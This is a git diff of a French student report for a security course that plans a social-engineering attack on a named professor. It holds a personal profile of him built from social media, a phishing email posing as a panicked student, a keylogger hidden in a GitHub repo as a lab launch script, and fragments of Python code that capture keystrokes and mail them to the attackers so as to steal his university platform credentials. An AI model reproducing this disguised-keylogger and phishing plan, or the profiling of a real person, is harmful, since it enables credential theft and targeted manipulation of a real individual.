@@ -339,7 +339,7 @@ Hobbies :
 - aime les produits Apple
 - aime Elon Musk et SpaceX, NASA
 - aime la technologie et la sécurité des technologies
-- a aimé les films et séries: Stranger Things, Mr Robot, Harry Potter, Retour vers le Futur, "The Woman in Red" avec Gene Wilder, Big Bang Theory, Family Guy, ...
+- a aimé les films et séries: Stranger Things, Mr Robot, Harry Potter, Retour vers le Futur, "The Woman in Red" avec Gene Wilder, Big Bang Theory, Family Guy, ... -> pop culture
 - apprécie les petits avions, l'aviation
 
 Info :
@@ -356,7 +356,7 @@ Nous avons pu apprendre à travers ses différents profils de réseaux sociaux q
 
 A travers ses diverses publications sur le réseau social Facebook, nous déduisons que son caractère est plutôt généreux, il a partagé beaucoup de publications de collectes de fonds pour des personnes malades, notamment des enfants. 
 
-M. Rubinstein a fait ses études obligatoires de 1986 à 1988 à U.E.N. José Ramon Yepez, à Maracaibo (Venezuela), il a obtenu son Bachelor d'ingénierie en électricité à l'université de Zulia, toujours à Macaraibo. La cible a ensuite obtenu son doctorat de l'EPFL en 2004, puis y a travaillé encore deux ans (jusqu'en 2006) sur le sujet `fast algorithms and parallel methods for computational electromagnetics`. Il enseigne à la HEIG-VD depuis 2007.
+M. Rubinstein a fait ses études obligatoires de 1986 à 1988 à U.E.N. José Ramon Yepez, à Maracaibo (Venezuela). Il a obtenu son Bachelor d'ingénierie en électricité à l'université de Zulia, toujours à Macaraibo. La cible a ensuite obtenu son doctorat de l'EPFL en 2004, puis y a travaillé encore deux ans (jusqu'en 2006) sur le sujet `fast algorithms and parallel methods for computational electromagnetics`. Il enseigne à la HEIG-VD depuis 2007.
 
 Il est toujours disponible pour aider ses étudiants, il est atteignable très rapidement en cas de questions. 
 
@@ -391,7 +391,7 @@ Nous avons écrit un script permettant d'activer un `keylogger` sur l'ordinateur
 
 ### 3.3 Payload de l'attaque 
 
-La payload sera constituée d'un message d'appel à l'aide de la part d'un étudiant en difficulté sur un projet, ainsi qu'un lien vers le repo Github contenant le projet en question.
+La payload sera constituée d'un message d'appel à l'aide de la part d'un étudiant en difficulté sur un projet, ainsi qu'un lien vers le repo Github contenant le projet en question :
 
 ```
 Bonjour Monsieur Rubinstein,
@@ -445,7 +445,7 @@ with Listener(on_press = on_press) as listener:
     listener.join()
 ```
 
-Pour que les données soient envoyées aux attaquants, nous avons écrit le script suivant : 
+Pour que les données récoltées soient envoyées aux attaquants, nous avons écrit le script suivant : 
 
 ```python
 import smtplib
@@ -498,7 +498,7 @@ try:
     ms.sendmail(user, to, msg.as_string())
     ms.quit()
 except smtplib.SMTPRecipientsRefused:
-    print("L'adresse " + to + " n'est pas valide !!!!!!!!!!!!!!!!!!")
+    print("L'adresse " + to + " n'est pas valide !")
 ```
 
 
@@ -508,22 +508,40 @@ except smtplib.SMTPRecipientsRefused:
 ### 4.1 Description de l'attaque 
 
 1. Repérage d'un laboratoire pouvant poser des problèmes aux étudiants
+
+   > Dans le cas présent, nous avons choisi le dernier laboratoire de SWI, car le cours est dispensé par le professeur Rubinstein en parallèle du cours de SEN. Le professeur est donc la personne la plus apte à nous aider sur notre "problème".
+
 2. Création d'un repo Github avec :
    1. Les éléments du `keylogger` (code et envoi de mail), 
    2. Un long script effectuant beaucoup d'opérations concernant le laboratoire (cracking de mots de passe, par exemple),
    3. Le script de lancement du `keylogger` confondu avec un script lançant le laboratoire.
+
+   > Le lien vers ce repo Github est : https://github.com/hans-arn/HEIGVD-SWI-Labo4-WPA-Entreprise.git. Tous les scripts se trouvent dessus.
+
 3. Rédaction du mail de "panique" avec le lien du repo Github inclus et la demande d'exécution du script malveillant
+
+   > Une capture d'écran du mail se trouve ci-dessous et le texte se trouve au paragraphe 3.3.
+
 4. Envoi du mail
+
 5. Récupération des identifiants confidentiels du professeur
 
 ![](images/mail_attaque.JPG)
 
 ### 4.2 Comportements de la cible
 
-Comme dit dans notre cours de social engineering, une demande d'une personne qui oblige la cible à agir dans l'urgence permet d'atténuer sa vigilance. C'est exactement ce que nous essayons de faire dans ce cas. Une élève en détresse qui a un besoin urgent d'aide pour un laboratoire qu'elle doit rendre rapidement fera en sorte d'éviter la méfiance de notre professeur. 
+Comme dit dans notre cours de social engineering, une demande d'une personne qui oblige la cible à agir dans l'urgence permet d'atténuer sa vigilance. C'est sur ce principe que nous nous appuyons pour effectuer cette attaque. Une élève en détresse qui a un besoin urgent d'aide pour un laboratoire qu'elle doit rendre rapidement fera en sorte d'éviter la méfiance de notre professeur. 
 
-Dans notre cas, il ne pensera pas à regarder ce que le script `run_lab.sh` effectue étant donné qu'il va vouloir déjà analyser l'erreur dans le laboratoire. En exécutant le script, il va lancer notre keylogger. Nous sommes parti du principe qu'il ne remarquera pas dans l'immédiat le but malicieux de notre programme. Quand il le découvrira, il sera trop tard le fichier avec ses frappes au clavier nous aura été envoyé. 
+Nous avons précédemment établi le caractère généreux de notre professeur, il est toujours disponible pour aider ses étudiants. Cette personnalité bienveillante associée au caractère urgent du mail vont pousser le professeur à agir vite et à ne pas regarder le contenu du script malveillant. Il voudra d'abord constater l'erreur dont parle l'étudiante dans son mail pour pouvoir l'aider au plus vite.
+
+En exécutant le script, il va lancer notre `keylogger`. Nous partons du principe qu'il ne remarquera pas dans l'immédiat le but malicieux de notre programme car il sera occupé à déchiffrer le problème survenu. Quand il le découvrira, il sera trop tard car le fichier avec ses frappes au clavier nous aura été envoyé. 
 
 ### 4.3 Résultats obtenus
 
-Notre but est d'obtenir les accès aux différentes plateformes comme **cyberlearn** et **gaps**, mais il est fort probable que nous obtenions d'autres informations en fonctions du temps que le keylogger reste actif.
+Nous aurons probablement obtenu les accès aux différentes plateformes comme **Cyberlearn** et **GAPS**, mais il est fort probable que nous obtenions d'autres informations en fonction du temps d'activité du `keylogger`. 
+
+
+
+##################################
+
+AJOUTER IMAGE DU FICHIER AVEC LES IDENTIFIANTS !!!!!!!!!!!!!!!!
